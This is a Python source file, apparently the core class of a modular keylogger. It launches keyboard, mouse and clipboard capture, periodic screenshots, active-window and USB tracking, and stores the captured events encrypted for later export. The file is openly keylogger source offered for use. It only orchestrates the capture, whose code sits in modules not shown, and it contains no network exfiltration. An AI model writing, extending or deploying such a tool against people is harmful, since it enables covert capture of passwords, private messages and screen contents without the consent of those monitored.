"""Main keylogger class with modular architecture and proper resource management."""

import os
import time
import threading
import signal
import sys
from typing import Optional, Dict, Any, List
from concurrent.futures import ThreadPoolExecutor
import logging
from pathlib import Path

from .config_manager import ConfigManager
from .encryption_manager import EncryptionManager
from .logging_manager import LoggingManager

logger = logging.getLogger(__name__)


class KeyloggerCore:
    """Main keylogger class with modular architecture."""
    
    def __init__(self, config_file: str = "config.json"):
        self.config = ConfigManager(config_file)
        self.encryption: Optional[EncryptionManager] = None
        self.log_manager: Optional[LoggingManager] = None
        self.listeners: Dict[str, Any] = {}
        self.threads: Dict[str, threading.Thread] = {}
        self.thread_pool: Optional[ThreadPoolExecutor] = None
        self.stop_event = threading.Event()
        self.is_running = False
        self.session_stats = {
            'start_time': None,
            'events_logged': 0,
            'errors': 0,
            'active_window': None,
            'window_start_time': None
        }
        
        self._setup_signal_handlers()
        self._initialize_components()
    
    def _setup_signal_handlers(self) -> None:
        """Setup signal handlers for graceful shutdown."""
        def signal_handler(signum, frame):
            logger.info(f"Received signal {signum}, initiating shutdown...")
            self.stop()
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        if hasattr(signal, 'SIGBREAK'):  # Windows
            signal.signal(signal.SIGBREAK, signal_handler)
    
    def _initialize_components(self) -> None:
        """Initialize all keylogger components."""
        try:
            # Initialize encryption if enabled
            if self.config.get('encryption.enabled', True):
                key_file = self.config.get('encryption.key_file', 'encryption.key')
                self.encryption = EncryptionManager(key_file)
            
            # Initialize logging manager
            self.log_manager = LoggingManager(self.config, self.encryption)
            
            # Initialize thread pool
            pool_size = self.config.get('performance.thread_pool_size', 4)
            self.thread_pool = ThreadPoolExecutor(max_workers=pool_size, thread_name_prefix='keylogger')
            
            logger.info("Keylogger components initialized successfully")
            
        except Exception as e:
            logger.error(f"Failed to initialize components: {e}")
            raise
    
    def start(self) -> None:
        """Start the keylogger with all enabled features."""
        if self.is_running:
            logger.warning("Keylogger is already running")
            return
        
        try:
            self.session_stats['start_time'] = time.time()
            self.is_running = True
            
            logger.info("Starting keylogger...")
            
            # Start listeners based on configuration
            self._start_listeners()
            
            # Start monitoring threads
            self._start_monitoring_threads()
            
            logger.info("Keylogger started successfully")
            
        except Exception as e:
            logger.error(f"Failed to start keylogger: {e}")
            self.session_stats['errors'] += 1
            self.stop()
            raise
    
    def _start_listeners(self) -> None:
        """Start input listeners based on configuration."""
        try:
            # Import listeners here to avoid circular imports
            from ..listeners.keyboard_listener import KeyboardListener
            from ..listeners.mouse_listener import MouseListener
            from ..listeners.clipboard_listener import ClipboardListener
            
            # Start keyboard listener
            if self.config.is_feature_enabled('key_logging'):
                self.listeners['keyboard'] = KeyboardListener(self)
                self.listeners['keyboard'].start()
                logger.info("Keyboard listener started")
            
            # Start mouse listener
            if self.config.is_feature_enabled('mouse_logging'):
                self.listeners['mouse'] = MouseListener(self)
                self.listeners['mouse'].start()
                logger.info("Mouse listener started")
            
            # Start clipboard listener
            if self.config.is_feature_enabled('clipboard_logging'):
                self.listeners['clipboard'] = ClipboardListener(self)
                self.listeners['clipboard'].start()
                logger.info("Clipboard listener started")
            
        except Exception as e:
            logger.error(f"Failed to start listeners: {e}")
            raise
    
    def _start_monitoring_threads(self) -> None:
        """Start monitoring threads for various features."""
        try:
            # Import monitors here to avoid circular imports
            from ..utils.window_monitor import WindowMonitor
            from ..utils.screenshot_monitor import ScreenshotMonitor
            from ..utils.usb_monitor import USBMonitor
            from ..utils.performance_monitor import PerformanceMonitor
            
            # Window monitoring
            if self.config.is_feature_enabled('window_tracking'):
                window_monitor = WindowMonitor(self)
                self.threads['window'] = threading.Thread(
                    target=window_monitor.run, 
                    name='window-monitor',
                    daemon=True
                )
                self.threads['window'].start()
                logger.info("Window monitor started")
            
            # Screenshot monitoring
            if self.config.is_feature_enabled('screenshots'):
                screenshot_monitor = ScreenshotMonitor(self)
                self.threads['screenshot'] = threading.Thread(
                    target=screenshot_monitor.run,
                    name='screenshot-monitor', 
                    daemon=True
                )
                self.threads['screenshot'].start()
                logger.info("Screenshot monitor started")
            
            # USB monitoring
            if self.config.is_feature_enabled('usb_monitoring'):
                usb_monitor = USBMonitor(self)
                self.threads['usb'] = threading.Thread(
                    target=usb_monitor.run,
                    name='usb-monitor',
                    daemon=True
                )
                self.threads['usb'].start()
                logger.info("USB monitor started")
            
            # Performance monitoring
            performance_monitor = PerformanceMonitor(self)
            self.threads['performance'] = threading.Thread(
                target=performance_monitor.run,
                name='performance-monitor',
                daemon=True
            )
            self.threads['performance'].start()
            logger.info("Performance monitor started")
            
        except Exception as e:
            logger.error(f"Failed to start monitoring threads: {e}")
            raise
    
    def stop(self) -> None:
        """Stop the keylogger gracefully."""
        if not self.is_running:
            return
        
        logger.info("Stopping keylogger...")
        
        try:
            # Signal all threads to stop
            self.stop_event.set()
            self.is_running = False
            
            # Stop listeners
            self._stop_listeners()
            
            # Wait for threads to finish
            self._wait_for_threads()
            
            # Cleanup resources
            self._cleanup_resources()
            
            # Log session statistics
            self._log_session_stats()
            
            logger.info("Keylogger stopped successfully")
            
        except Exception as e:
            logger.error(f"Error during shutdown: {e}")
    
    def _stop_listeners(self) -> None:
        """Stop all input listeners."""
        for name, listener in self.listeners.items():
            try:
                if hasattr(listener, 'stop'):
                    listener.stop()
                logger.debug(f"{name} listener stopped")
            except Exception as e:
                logger.error(f"Error stopping {name} listener: {e}")
    
    def _wait_for_threads(self) -> None:
        """Wait for all threads to finish with timeout."""
        timeout = 5.0  # seconds
        
        for name, thread in self.threads.items():
            try:
                thread.join(timeout=timeout)
                if thread.is_alive():
                    logger.warning(f"Thread {name} did not stop within timeout")
                else:
                    logger.debug(f"Thread {name} stopped")
            except Exception as e:
                logger.error(f"Error waiting for thread {name}: {e}")
    
    def _cleanup_resources(self) -> None:
        """Cleanup all resources."""
        try:
            # Cleanup logging manager
            if self.log_manager:
                self.log_manager.cleanup()
            
            # Shutdown thread pool
            if self.thread_pool:
                self.thread_pool.shutdown(wait=True, timeout=5.0)
            
            logger.debug("Resource cleanup completed")
            
        except Exception as e:
            logger.error(f"Error during resource cleanup: {e}")
    
    def _log_session_stats(self) -> None:
        """Log session statistics."""
        try:
            if self.session_stats['start_time']:
                duration = time.time() - self.session_stats['start_time']
                self.session_stats['duration'] = duration
            
            logger.info("=== Session Statistics ===")
            logger.info(f"Duration: {self.session_stats.get('duration', 0):.2f} seconds")
            logger.info(f"Events logged: {self.session_stats['events_logged']}")
            logger.info(f"Errors: {self.session_stats['errors']}")
            
            if self.log_manager:
                log_stats = self.log_manager.get_stats()
                logger.info(f"Buffer flushes: {log_stats.get('buffer_flushes', 0)}")
                logger.info(f"Encryption operations: {log_stats.get('encryption_operations', 0)}")
            
            logger.info("=========================")
            
        except Exception as e:
            logger.error(f"Error logging session stats: {e}")
    
    def log_event(self, event_type: str, details: str, window_name: str = "Unknown", 
                  metadata: Optional[Dict[str, Any]] = None) -> None:
        """Log an event through the logging manager."""
        try:
            if self.log_manager and self.is_running:
                self.log_manager.log_event(event_type, details, window_name, metadata=metadata)
                self.session_stats['events_logged'] += 1
        except Exception as e:
            logger.error(f"Error logging event: {e}")
            self.session_stats['errors'] += 1
    
    def update_active_window(self, window_name: str) -> None:
        """Update the currently active window."""
        if self.session_stats['active_window'] != window_name:
            # Log time spent on previous window
            if (self.session_stats['active_window'] and 
                self.session_stats['window_start_time']):
                time_spent = time.time() - self.session_stats['window_start_time']
                self.log_event(
                    "Time Spent", 
                    f"{time_spent:.2f} seconds",
                    self.session_stats['active_window']
                )
            
            # Update to new window
            self.session_stats['active_window'] = window_name
            self.session_stats['window_start_time'] = time.time()
            self.log_event("Active Window Changed", f"Switched to {window_name}", window_name)
    
    def run(self) -> None:
        """Run the keylogger until stopped."""
        try:
            self.start()
            
            # Keep running until stop event is set
            while not self.stop_event.is_set():
                self.stop_event.wait(1.0)
            
        except KeyboardInterrupt:
            logger.info("Received keyboard interrupt")
        except Exception as e:
            logger.error(f"Unexpected error in main loop: {e}")
            self.session_stats['errors'] += 1
        finally:
            self.stop()
    
    def get_status(self) -> Dict[str, Any]:
        """Get current keylogger status."""
        status = {
            'running': self.is_running,
            'session_stats': self.session_stats.copy(),
            'active_listeners': list(self.listeners.keys()),
            'active_threads': [name for name, thread in self.threads.items() if thread.is_alive()],
            'config_file': str(self.config.config_file)
        }
        
        if self.log_manager:
            status['logging_stats'] = self.log_manager.get_stats()
        
        if self.encryption:
            status['encryption_info'] = self.encryption.get_key_info()
        
        return status
    
    def export_logs(self, output_file: str, format_type: str = 'json') -> None:
        """Export logs in specified format."""
        if self.log_manager:
            self.log_manager.export_logs(output_file, format_type)
        else:
            raise RuntimeError("Logging manager not initialized")
    
    def reload_config(self) -> None:
        """Reload configuration from file."""
        try:
            self.config.load_config()
            logger.info("Configuration reloaded")
        except Exception as e:
            logger.error(f"Error reloading configuration: {e}")
            raise